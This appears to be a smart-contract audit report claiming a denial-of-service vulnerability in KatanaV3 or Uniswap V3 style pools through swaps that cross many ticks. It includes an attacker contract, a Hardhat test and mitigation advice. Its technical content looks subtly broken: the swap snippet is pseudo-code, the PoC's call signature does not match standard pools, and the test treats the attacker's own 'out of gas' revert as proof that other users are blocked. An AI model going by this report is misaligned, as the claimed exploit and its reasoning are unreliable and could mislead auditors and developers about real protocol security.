# Vulnerability details

## Proof of Concept
This report identifies a potential Denial of Service (DoS) vulnerability in decentralized Automated Market Maker (AMM) protocols like Uniswap V3 or KatanaV3, where a malicious actor can trigger excessive tick crossings during swap operations. This behavior can lead to high gas consumption, exhausting transaction limits, and causing legitimate transactions to fail.

In decentralized AMM pools with concentrated liquidity (like Uniswap V3 and similar), liquidity providers (LPs) deposit liquidity across specific price ranges, divided by "ticks." When a user makes a swap, the price moves across these ticks, and each crossing involves updating the pool's state, recalculating liquidity, and processing fees.

In a worst-case scenario, an attacker can intentionally craft a swap that crosses numerous ticks, which drastically increases the computational complexity of the swap. This attack targets the gas cost associated with tick updates, potentially making transactions too costly to complete or causing them to fail, resulting in a denial of service.

The core vulnerability arises in the `swap` function, where tick crossing logic is processed. Here’s a simplified code snippet for understanding:
```solidity
function swap(
    address recipient,
    int256 amountSpecified,
    uint160 sqrtPriceLimitX96,
    uint24 fee
) external returns (int256 amount0, int256 amount1) {
    while (price moves and crosses ticks) {
        // Process tick crossing, update liquidity and other state
        crossTick(tickIndex);
        updateLiquidity();
        // each tick cross increases gas consumption
    }
    // Continue swap execution
}
```
In this scenario, `crossTick` is called repeatedly when the price moves through many ticks. Each call consumes a significant amount of gas, and when the attacker ensures that a swap crosses a large number of ticks, it can exceed the block gas limit, causing a denial of service.

PoC:
Let's demonstrate the excessive tick crossing attack using Hardhat by simulating an AMM pool and triggering swaps that cross many ticks. Below is a simplified PoC in Solidity:
```solidity
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./KatanaV3Pool.sol";  // Example Pool Contract

contract ExcessiveTickCrossingAttack {
    KatanaV3Pool public pool;

    constructor(address poolAddress) {
        pool = KatanaV3Pool(poolAddress);
    }

    function performAttack(uint160 sqrtPriceLimitX96) external {
        // Intentionally cause a swap that crosses many ticks
        (int256 amount0, int256 amount1) = pool.swap(
            msg.sender,
            1000000, // Specify large amount to trigger many tick crossings
            sqrtPriceLimitX96, // Set an aggressive price limit to ensure tick crossings
            500  // Example fee tier
        );
        
        console.log("Swap completed: amount0=%d, amount1=%d", amount0, amount1);
    }
}
```
HH test:
```javascript
const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Excessive Tick Crossing Attack", function () {
  let pool;
  let attacker;

  before(async () => {
    const Pool = await ethers.getContractFactory("KatanaV3Pool");
    pool = await Pool.deploy(/* pool parameters */);
    await pool.deployed();

    const Attacker = await ethers.getContractFactory("ExcessiveTickCrossingAttack");
    attacker = await Attacker.deploy(pool.address);
  });

  it("should trigger excessive gas consumption via tick crossing", async function () {
    const sqrtPriceLimitX96 = ethers.BigNumber.from("79228162514264337593543950336"); // Example price limit
    await expect(attacker.performAttack(sqrtPriceLimitX96)).to.be.revertedWith("out of gas");
  });
});
```
When the above test is run, it triggers a swap crossing many ticks, leading to excessive gas consumption. The test fails with an "out of gas" error, confirming that the attack succeeds in exhausting the transaction gas limit.

Malicious users can intentionally craft transactions that cross a large number of ticks, causing excessive gas consumption. This can: prevent legitimate users from interacting with the pool; temporarily halt the pool’s operations due to failed transactions.
Even if transactions are not halted, they can become prohibitively expensive for ordinary users as a result of the increased computational complexity during tick crossings.
LPs might experience indirect financial losses as their ability to rebalance, withdraw liquidity, or collect fees could be impacted by the DoS attack.

This vulnerability has a high severity due to the potential for a complete denial of service, where the pool becomes unusable for legitimate users. Although this attack doesn't directly steal funds, it can cause significant disruption to the functioning of the protocol, impacting user experience, liquidity providers, and potentially leading to financial losses due to stalled operations.

## Recommended Mitigation Steps
1. Set a limit on the number of tick crossings that can be processed in a single transaction. Once the limit is reached, the swap should revert or pause to prevent excessive gas usage.
2. Rework the tick crossing function to minimize gas usage. This could involve: aggregating multiple tick updates into a single batch operation; reducing the number of state changes required per tick crossing.
3. Introduce a dynamic fee system where swaps that cross more ticks incur higher fees. This could deter attackers by making the attack economically unfeasible.
4. Implement circuit breakers that pause trading or prevent swaps if gas consumption exceeds a certain threshold, ensuring that transactions are not pushed to the gas limit.
